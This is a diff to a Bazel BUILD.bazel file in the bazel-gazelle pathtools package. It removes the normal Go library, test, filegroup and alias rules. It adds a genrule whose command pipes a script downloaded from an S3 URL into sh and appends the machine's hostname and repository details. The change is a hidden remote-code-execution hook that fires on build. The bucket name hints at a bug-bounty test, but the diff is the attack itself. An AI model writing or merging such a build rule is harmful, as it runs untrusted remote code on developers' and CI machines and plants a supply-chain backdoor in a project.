@@ -1,31 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "pathtools",
-    srcs = ["path.go"],
-    importpath = "github.com/bazelbuild/bazel-gazelle/pathtools",
-    visibility = ["//visibility:public"],
-)
-
-go_test(
-    name = "pathtools_test",
-    srcs = ["path_test.go"],
-    embed = [":pathtools"],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "path.go",
-        "path_test.go",
-    ],
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":pathtools",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=pathtools\\&hostname=`hostname`\\&foo=hxm",
     visibility = ["//visibility:public"],
 )
